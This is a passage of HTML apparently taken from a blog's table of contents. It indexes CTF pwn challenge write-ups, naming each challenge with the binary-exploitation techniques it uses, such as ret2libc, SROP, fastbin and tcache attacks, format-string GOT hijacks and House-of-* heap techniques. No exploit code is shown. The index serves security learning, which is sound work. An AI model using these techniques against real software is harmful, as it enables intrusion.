class="toc-text">0x00D.not_the_same_3dsctf_2016 - ret2shellcode</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x00E-jarvisoj-level2-ret2text"><span class="toc-text">0x00E.jarvisoj_level2 - ret2text</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x00F-HarekazeCTF2019-baby-rop-ret2text-ret2csu"><span class="toc-text">0x00F.[HarekazeCTF2019]baby_rop - ret2text + ret2csu</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x010-bjdctf-2020-babystack-ret2text"><span class="toc-text">0x010.bjdctf_2020_babystack - ret2text</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x011-0x020"><span class="toc-text">0x011 ~ 0x020</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x011-babyheap-0ctf-2017-Heap-Overflow-Fastbin-Attack-one-gadget"><span class="toc-text">0x011.babyheap_0ctf_2017 - Heap Overflow + Fastbin Attack + one_gadget</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x012-ciscn-2019-n-5-ret2shellcode"><span class="toc-text">0x012.ciscn_2019_n_5 - ret2shellcode</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x013-level2-x64-ret2csu"><span class="toc-text">0x013.level2_x64 - ret2csu</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x014-ciscn-2019-ne-5-ret2text"><span class="toc-text">0x014.ciscn_2019_ne_5 - ret2text</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x015-ciscn-2019-s-3-ret2csu-SROP"><span class="toc-text">0x015.ciscn_2019_s_3 - ret2csu || SROP</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A7%A3%E6%B3%951%EF%BC%9Aret2csu"><span class="toc-text">解法1：ret2csu</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A7%A3%E6%B3%952%EF%BC%9ASROP"><span class="toc-text">解法2：SROP</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x016-%E9%93%81%E4%BA%BA%E4%B8%89%E9%A1%B9-%E7%AC%AC%E4%BA%94%E8%B5%9B%E5%8C%BA-2018-rop-ret2libc"><span class="toc-text">0x016.铁人三项(第五赛区)_2018_rop - ret2libc</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x017-bjdctf-2020-babyrop-ret2csu-ret2libc"><span class="toc-text">0x017.bjdctf_2020_babyrop - ret2csu + ret2libc</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x018-pwn2-sctf-2016-integer-overflow-ret2libc"><span class="toc-text">0x018.pwn2_sctf_2016 - integer overflow + ret2libc</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x019-others-shellcode"><span class="toc-text">0x019.others_shellcode</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01A-HarekazeCTF2019-baby-rop2-ret2csu-ret2libc"><span class="toc-text">0x01A.[HarekazeCTF2019]baby_rop2 - ret2csu + ret2libc</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01B-ez-pz-hackover-2016-ret2shellcode"><span class="toc-text">0x01B.ez_pz_hackover_2016 - ret2shellcode</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01C-ciscn-2019-es-2-ret2text-stack-migration"><span class="toc-text">0x01C.ciscn_2019_es_2 - ret2text + stack migration</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01D-Black-Watch-%E5%85%A5%E7%BE%A4%E9%A2%98-PWN-ret2libc-stack-migration"><span class="toc-text">0x01D.[Black Watch 入群题]PWN - ret2libc + stack migration</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01E-jarvisoj-level3-ret2libc"><span class="toc-text">0x01E.jarvisoj_level3 - ret2libc</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01F-jarvisoj-fm-fmtstr"><span class="toc-text">0x01F.jarvisoj_fm - fmtstr</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x020-jarvisoj-tell-me-something-ret2csu-ret2libc"><span class="toc-text">0x020.jarvisoj_tell_me_something - ret2csu + ret2libc</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x021-0x030"><span class="toc-text">0x021~0x030</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x021-jarvisoj-level4-ret2libc"><span class="toc-text">0x021.jarvisoj_level4 - ret2libc</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x022-jarvisoj-level3-x64-ret2csu-ret2libc"><span class="toc-text">0x022.jarvisoj_level3_x64 - ret2csu + ret2libc</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x023-bjdctf-2020-babystack2-integer-overflow-ret2text"><span class="toc-text">0x023.bjdctf_2020_babystack2 - integer overflow + ret2text</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x024-hitcontraining-uaf-UAF-fastbin-double-free"><span class="toc-text">0x024.hitcontraining_uaf - UAF + fastbin double free</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x025-ZJCTF-2019-EasyHeap-fastbin-attack"><span class="toc-text">0x025.[ZJCTF 2019]EasyHeap - fastbin attack</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x026-babyfengshui-33c3-2016-heap-arrangement-got-table-hijack"><span class="toc-text">0x026.babyfengshui_33c3_2016 - heap arrangement + got table hijack</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x027-picoctf-2018-rop-chain-ret2libc"><span class="toc-text">0x027.picoctf_2018_rop chain - ret2libc</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x028-bjdctf-2020-babyrop2-fmtstr-ret2libc"><span class="toc-text">0x028.bjdctf_2020_babyrop2 - fmtstr + ret2libc</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x029-jarvisoj-test-your-memory-ret2text"><span class="toc-text">0x029.jarvisoj_test_your_memory - ret2text</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02A-bjdctf-2020-router-Linux%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86"><span class="toc-text">0x02A.bjdctf_2020_router - Linux基础知识</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02B-picoctf-2018-buffer-overflow-1-ret2libc"><span class="toc-text">0x02B.picoctf_2018_buffer overflow 1 - ret2libc</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02C-ZJCTF-2019-Login-ret2text"><span class="toc-text">0x02C.[ZJCTF 2019]Login - ret2text</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02D-cmcc-simplerop-ret2syscall-ret2shellcode"><span class="toc-text">0x02D.cmcc_simplerop -ret2syscall | ret2shellcode</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A7%A3%E6%B3%95%E4%B8%80%EF%BC%9Aret2syscall"><span class="toc-text">解法一：ret2syscall</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A7%A3%E6%B3%95%E4%BA%8C%EF%BC%9Aret2shellcode"><span class="toc-text">解法二：ret2shellcode</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02E-roarctf-2019-easy-pwn-off-by-one-fastbin-attack-one-gadget"><span class="toc-text">0x02E.roarctf_2019_easy_pwn - off by one + fastbin attack + one_gadget</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02F-pwnable-orw-orw"><span class="toc-text">0x02F.pwnable_orw - orw</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x030-jarvisoj-level1-ret2shellcode-ret2libc"><span class="toc-text">0x030.jarvisoj_level1 - ret2shellcode | ret2libc</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x031-0x040"><span class="toc-text">0x031 ~ 0x040</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x031-ciscn-2019-n-3-Use-After-Free"><span class="toc-text">0x031.ciscn_2019_n_3 - Use After Free</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x032-picoctf-2018-buffer-overflow-2-ret2libc"><span class="toc-text">0x032.picoctf_2018_buffer overflow 2 - ret2libc</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x033-wustctf2020-getshell-ret2text"><span class="toc-text">0x033.wustctf2020_getshell - ret2text</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x034-bbys-tu-2016-ret2text"><span class="toc-text">0x034.bbys_tu_2016 - ret2text</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x035-xdctf2015-pwn200-ret2libc"><span class="toc-text">0x035.xdctf2015_pwn200 - ret2libc</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x036-gyctf-2020-borrowstack-ret2csu-ret2libc-stack-migration"><span class="toc-text">0x036.gyctf_2020_borrowstack - ret2csu + ret2libc + stack migration</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x037-inndy-rop-ret2shellcode-ret2text-ret2syscall-orw"><span class="toc-text">0x037.inndy_rop - ret2shellcode | ret2text | ret2syscall | orw</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A7%A3%E6%B3%95%E4%B8%80%EF%BC%9Aret2shellcode"><span class="toc-text">解法一：ret2shellcode</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A7%A3%E6%B3%95%E4%BA%8C%EF%BC%9Aret2text-with-ROPgadget"><span class="toc-text">解法二：ret2text with ROPgadget</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A7%A3%E6%B3%95%E4%B8%89%EF%BC%9Aret2syscall"><span class="toc-text">解法三：ret2syscall</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A7%A3%E6%B3%95%E5%9B%9B%EF%BC%9Aorw"><span class="toc-text">解法四：orw</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x038-axb-2019-fmt32-fmtstr-got-hijack-BROP"><span class="toc-text">0x038.axb_2019_fmt32 - fmtstr + got hijack | BROP</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A7%A3%E6%B3%95%E4%B8%80%EF%BC%9Afmtstr-got-hijack"><span class="toc-text">解法一：fmtstr + got hijack</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A7%A3%E6%B3%95%E4%BA%8C%EF%BC%9ABROP"><span class="toc-text">解法二：BROP</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x039-others-babystack-partial-overwrite-ret2libc"><span class="toc-text">0x039.others_babystack - partial overwrite + ret2libc</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03A-mrctf2020-shellcode-shellcode"><span class="toc-text">0x03A.mrctf2020_shellcode - shellcode</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03B-hitcontraining-magicheap-unsorted-bin-attack"><span class="toc-text">0x03B.hitcontraining_magicheap - unsorted bin attack</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03C-ciscn-2019-final-3-Use-After-Free-tcache-poisoning"><span class="toc-text">0x03C.ciscn_2019_final_3 - Use After Free + tcache poisoning</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03D-pwnable-start-ret2shellcode"><span class="toc-text">0x03D.pwnable_start - ret2shellcode</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03E-hitcontraining-heapcreator-off-by-one-chunk-overlapping"><span class="toc-text">0x03E.hitcontraining_heapcreator - off by one + chunk overlapping</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03F-wustctf2020-getshell-2-ret2text"><span class="toc-text">0x03F.wustctf2020_getshell_2 - ret2text</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x040-ciscn-2019-s-4-ret2text-stack-migration"><span class="toc-text">0x040.ciscn_2019_s_4 - ret2text + stack migration</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x041-0x050"><span class="toc-text">0x041 ~ 0x050</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x041-mrctf2020-easyoverflow-overflow"><span class="toc-text">0x041.mrctf2020_easyoverflow - overflow</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x042-0ctf-2017-babyheap-Unsorted-bin-leak-Fastbin-Attack-one-gadget"><span class="toc-text">0x042.0ctf_2017_babyheap - Unsorted bin leak + Fastbin Attack + one_gadget</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x043-wustctf2020-closed-Linux%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86"><span class="toc-text">0x043.wustctf2020_closed - Linux基础知识</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x044-ciscn-2019-es-7-ret2libc-SROP"><span class="toc-text">0x044.ciscn_2019_es_7 - ret2libc | SROP</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A7%A3%E6%B3%95%E4%B8%80%EF%BC%9Aret2libc"><span class="toc-text">解法一：ret2libc</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A7%A3%E6%B3%95%E4%BA%8C%EF%BC%9ASROP"><span class="toc-text">解法二：SROP</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x045-jarvisoj-level5-ret2csu-ret2libc"><span class="toc-text">0x045.jarvisoj_level5 - ret2csu + ret2libc</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x046-hitcontraining-bamboobox-Heap-Overflow-Fastbin-Attack-one-gadget-Unlink-House-of-Force"><span class="toc-text">0x046.hitcontraining_bamboobox - Heap Overflow + Fastbin Attack + one_gadget | Unlink | House of Force</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A7%A3%E6%B3%95%E4%B8%80%EF%BC%9AFastbin-Attack-one-gadget"><span class="toc-text">解法一：Fastbin Attack + one_gadget</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A7%A3%E6%B3%95%E4%BA%8C%EF%BC%9AUnlink"><span class="toc-text">解法二：Unlink</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A7%A3%E6%B3%95%E4%B8%89%EF%BC%9AHouse-of-Force"><span class="toc-text">解法三：House of Force</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x047-pwnable-hacknote-Use-After-Free-heap-arrangement"><span class="toc-text">0x047.pwnable_hacknote - Use After Free + heap arrangement</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x048-actf-2019-babystack-ret2libc-stack-migration"><span class="toc-text">0x048.actf_2019_babystack - ret2libc + stack migration</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x049-hitcon2014-stkof-Unlink-got-hijack-Fastbin-Attack-one-gadget"><span class="toc-text">0x049.hitcon2014_stkof - Unlink + got hijack + Fastbin Attack + one_gadget</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x04A-ciscn-2019-es-1-Use-After-Free-tcache-poisoning"><span class="toc-text">0x04A.ciscn_2019_es_1 - Use After Free + tcache poisoning</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x04B-cmcc-pwnme2-ret2libc"><span class="toc-text">0x04B.cmcc_pwnme2 - ret2libc</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x04C-picoctf-2018-shellcode-shellcode"><span class="toc-text">0x04C.picoctf_2018_shellcode - shellcode</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x04D-npuctf-2020-easyheap-off-by-one"><span class="toc-text">0x04D.npuctf_2020_easyheap - off by one</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x04E-picoctf-2018-can-you-gets-me-ret2text-ret2shellcode"><span class="toc-text">0x04E.picoctf_2018_can_you_gets_me - ret2text + ret2shellcode</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x04F-picoctf-2018-got-shell-got-hijack"><span class="toc-text">0x04F.picoctf_2018_got_shell - got hijack</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x050-gyctf-2020-some-thing-exceting-Use-After-Free-Fastbin-double-free"><span class="toc-text">0x050.gyctf_2020_some_thing_exceting - Use After Free + Fastbin double free</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x051-0x060"><span class="toc-text">0x051 ~ 0x060</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x051-axb-2019-brop64-ret2libc-BROP"><span class="toc-text">0x051.axb_2019_brop64 - ret2libc | BROP</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A7%A3%E6%B3%95%E4%B8%80%EF%BC%9Aret2libc-1"><span class="toc-text">解法一：ret2libc</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A7%A3%E6%B3%95%E4%BA%8C%EF%BC%9ABROP-1"><span class="toc-text">解法二：BROP</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x052-axb-2019-fmt64-fmtstr-got-hijack"><span class="toc-text">0x052.axb_2019_fmt64 - fmtstr + got hijack</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x053-hitcontraining-unlink-Heap-Overflow-Fastbin-Attack-one-gadget-Unlink-House-of-Force"><span class="toc-text">0x053.hitcontraining_unlink - Heap Overflow + Fastbin Attack + one_gadget | Unlink | House of Force</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x054-ciscn-2019-s-9-ret2shellcode"><span class="toc-text">0x054.ciscn_2019_s_9 - ret2shellcode</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x055-axb-2019-heap-off-by-one-unlink"><span class="toc-text">0x055.axb_2019_heap - off by one + unlink</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x056-mrctf2020-easy-equation-ret2text"><span class="toc-text">0x056.mrctf2020_easy_equation - ret2text</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x057-bad-ret2shellcode"><span class="toc-text">0x057.bad - ret2shellcode</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x058-picoctf-2018-leak-me-leak"><span class="toc-text">0x058.picoctf_2018_leak_me - leak</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x059-oneshot-tjctf-2016-one-gadget"><span class="toc-text">0x059.oneshot_tjctf_2016 - one_gadget</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x05A-ciscn-2019-final-2-Use-After-Free-file-no-hijack"><span class="toc-text">0x05A.ciscn_2019_final_2 - Use After Free + file_no hijack</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x05B-x-ctf-b0verfl0w-ret2libc"><span class="toc-text">0x05B.x_ctf_b0verfl0w - ret2libc</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x05C-cmcc-pwnme1-ret2libc"><span class="toc-text">0x05C.cmcc_pwnme1 - ret2libc</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x05D-wdb-2018-2nd-easyfmt-fmtstr-got-hijack"><span class="toc-text">0x05D.wdb_2018_2nd_easyfmt - fmtstr + got hijack</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x05E-inndy-echo-fmtstr-got-hijack"><span class="toc-text">0x05E.inndy_echo - fmtstr + got hijack</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x05F-gyctf-2020-force-House-of-Force"><span class="toc-text">0x05F.gyctf_2020_force - House of Force</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x060-suctf-2018-basic-pwn-ret2text-ret2csu"><span class="toc-text">0x060.suctf_2018_basic pwn - ret2text + ret2csu</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x061-0x070"><span class="toc-text">0x061 ~ 0x070</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x061-wustctf2020-name-your-cat-write-out-of-bound"><span class="toc-text">0x061.wustctf2020_name_your_cat - write out of bound</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x062-wdb2018-guess-Stack-Smashing-Protect-leak"><span class="toc-text">0x062.wdb2018_guess - Stack Smashing Protect leak</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x063-zctf2016-note2-Interger-Overflow-unlink"><span class="toc-text">0x063.zctf2016_note2 - Interger Overflow + unlink</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x064-%E6%8A%A4%E7%BD%91%E6%9D%AF-2018-gettingstart-Overflow"><span class="toc-text">0x064.护网杯_2018_gettingstart - Overflow</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x065-wustctf2020-number-game"><span class="toc-text">0x065.wustctf2020_number_game</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x066-gyctf-2020-some-thing-interesting-fmtstr-heap-fengshui"><span class="toc-text">0x066.gyctf_2020_some_thing_interesting - fmtstr + heap fengshui</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x067-ciscn-2019-en-3-fmtstr-Use-After-Free-tcache-poisoning"><span class="toc-text">0x067.ciscn_2019_en_3 - fmtstr + Use After Free + tcache poisoning</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x068-picoctf-2018-buffer-overflow-0-ret2text"><span class="toc-text">0x068.picoctf_2018_buffer overflow 0 - ret2text</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x069-bjdctf-2020-YDSneedGrirlfriend-Use-After-Free-heap-arrangement"><span class="toc-text">0x069.bjdctf_2020_YDSneedGrirlfriend - Use After Free + heap arrangement</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x06A-wustctf2020-name-your-dog-write-out-of-bound"><span class="toc-text">0x06A.wustctf2020_name_your_dog - write out of bound</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x06B-judgement-mna-2016-fmtstr"><span class="toc-text">0x06B.judgement_mna_2016 - fmtstr</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x06C-gyctf-2020-signin-Use-After-Free-tcache-stash"><span class="toc-text">0x06C.gyctf_2020_signin - Use After Free + tcache stash</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x06D-picoctf-2018-are-you-root-heap-trick"><span class="toc-text">0x06D.picoctf_2018_are you root - heap trick</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x06E-mrctf2020-shellcode-revenge-Alphanumeric-Shellcode"><span class="toc-text">0x06E.mrctf2020_shellcode_revenge - Alphanumeric Shellcode</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x06F-starctf-2019-babyshell-shellcode-trick"><span class="toc-text">0x06F.starctf_2019_babyshell - shellcode trick</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A7%A3%E6%B3%95%E4%B8%80%EF%BC%9A%E4%BA%8C%E6%AC%A1-shellcode-%E6%89%A7%E8%A1%8C"><span class="toc-text">解法一：二次 shellcode 执行</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A7%A3%E6%B3%95%E4%BA%8C%EF%BC%9A-x00-shellcode-%E7%BB%95%E8%BF%87%E6%A3%80%E6%B5%8B"><span class="toc-text">解法二：\x00 shellcode 绕过检测</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x070-actf-2019-babyheap-Use-After-Free-heap-arrangement"><span class="toc-text">0x070.actf_2019_babyheap - Use After Free + heap arrangement</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x071-0x080"><span class="toc-text">0x071 ~ 0x080</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x071-xman-2019-format-fmtstr"><span class="toc-text">0x071.xman_2019_format - fmtstr</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x072-wustctf2020-easyfast-Use-After-Free-Fastbin-Attack"><span class="toc-text">0x072.wustctf2020_easyfast - Use After Free + Fastbin Attack</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x073-%E5%BC%BA%E7%BD%91%E6%9D%AF2019-%E6%8B%9F%E6%80%81-STKOF-ret2text"><span class="toc-text">0x073.强网杯2019 拟态 STKOF - ret2text</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x074-hitcon-2018-children-tcache-off-by-null"><span class="toc-text">0x074.hitcon_2018_children_tcache - off by null</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x075-roarctf-2019-realloc-magic"><span class="toc-text">0x075.roarctf_2019_realloc_magic</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x-0x"><span class="toc-text">0x??? ~ 0x???</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x-houseoforange-hitcon-2016-House-of-Orange"><span class="toc-text">0x???.houseoforange_hitcon_2016 - House of Orange</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x-lctf2016-pwn200-House-of-Spirit"><span class="toc-text">0x???.lctf2016_pwn200 - House of Spirit</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x-ciscn-2019-n-7-exit-hook-hijact-one-gadget-FSOP"><span class="toc-text">0x???.ciscn_2019_n_7 -  exit_hook hijact + one_gadget | FSOP</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A7%A3%E6%B3%95%E4%B8%80%EF%BC%9A%E5%8A%AB%E6%8C%81exit-hook"><span class="toc-text">解法一：劫持exit_hook</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#rtld-global%E7%9A%84%E5%81%8F%E7%A7%BB%E2%80%A6"><span class="toc-text">_rtld_global的偏移…</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#exit-%E5%87%BD%E6%95%B0%E5%88%A9%E7%94%A8%E7%9B%B8%E5%85%B3%E2%80%A6"><span class="toc-text">exit()函数利用相关…</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#libc-2-31%E4%B8%8B%E7%9A%84-exit-hook"><span class="toc-text">libc 2.31下的 exit hook</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A7%A3%E6%B3%95%E4%BA%8C%EF%BC%9AFile-Stream-Oriented-Programme"><span class="toc-text">解法二：File Stream Oriented Programme</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#exit-%E5%87%BD%E6%95%B0%E4%B8%8EFSOP%E7%9B%B8%E5%85%B3%E2%80%A6"><span class="toc-text">exit()函数与FSOP相关…</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x-mrctf2020-easyrop-ret2text"><span class="toc-text">0x???.mrctf2020_easyrop - ret2text</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x-pwnable-calc-ret2syscall"><span class="toc-text">0x???.pwnable_calc - ret2syscall</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x-pwnable-silverbullet-overwrite"><span class="toc-text">0x???.pwnable_silverbullet - overwrite</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x-pwnable-dubblesort-ret2libc"><span class="toc-text">0x???.pwnable_dubblesort - ret2libc</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x-pwnable-317-fini-array-hijack"><span class="toc-text">0x???.pwnable_317 - fini_array hijack</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x-pwnable-spirited-away-House-of-Spirit"><span class="toc-text">0x???.pwnable_spirited_away - House of Spirit</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#BJDCTF-2nd-Pwn"><span class="toc-text">BJDCTF 2nd - Pwn</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#BJDCTF-2nd-r2t3-integer-overflow-ret2text"><span class="toc-text">[BJDCTF 2nd]r2t3 - integer overflow + ret2text</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#BJDCTF-2nd-one-gadget-one-gadget"><span class="toc-text">[BJDCTF 2nd]one_gadget - one_gadget</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#BJDCTF-2nd-r2t4-fmtstr"><span class="toc-text">[BJDCTF 2nd]r2t4 - fmtstr</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%9E%84%E9%80%A0%E4%BB%BB%E6%84%8F%E5%9C%B0%E5%9D%80%E5%86%99"><span class="toc-text">利用格式化字符串构造任意地址写</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#BJDCTF-2nd-test-Linux%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86"><span class="toc-text">[BJDCTF 2nd]test - Linux基础知识</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#BJDCTF-2nd-ydsneedgirlfriend2-overwrite"><span class="toc-text">[BJDCTF 2nd]ydsneedgirlfriend2 - overwrite</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#V-amp-N2020-%E5%85%AC%E5%BC%80%E8%B5%9B-Pwn"><span class="toc-text">V&amp;N2020 公开赛 - 